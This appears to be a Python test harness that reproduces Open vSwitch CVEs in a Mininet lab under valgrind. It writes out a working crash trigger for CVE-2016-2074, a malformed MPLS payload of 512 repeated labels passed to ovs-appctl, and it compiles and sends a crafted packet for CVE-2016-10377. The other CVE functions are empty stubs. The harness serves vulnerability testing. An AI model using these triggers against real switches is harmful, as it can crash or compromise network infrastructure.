import os
import ovs_valgrind
from mininet.log import setLogLevel
from time import sleep
from mininet_setup import MininetNetwork

def cve_2016_2074():
    os.system('sudo ovs-vsctl add-br br0')

    os.system('ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')

    os.system('sudo ovs-vsctl del-br br0')

def cve_2016_10377():

    setLogLevel('info')
    os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')

    ovs_valgrind.start_valgrind('cve_2016_10377')
    
    mininet = MininetNetwork()
    mininet.mininet_2h_1s()

    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
    #sleep(5)
    mininet.net['h1'].cmd('./packets/cve_2016_10377')
    #sleep(10)

    #mininet.net['h2'].cmd('sudo killall wireshark')
    mininet.stop_mininet()
    mininet.cleanup_network()

    ovs_valgrind.valgrind_cleanup()

    os.system('rm packets/cve_2016_10377')

def cve_2017_9264():
    pass

def cve_2020_27827():
    pass

def cve_2020_35498():
    pass

def cve_2021_3905():
    pass

def cve_2022_4337():
    pass

def cve_2022_4338():
    pass

def cve_2022_32166():
    pass

def cve_2023_1668():
    pass

if __name__ == '__main__':
    #cve_2016_2074()
    cve_2016_10377()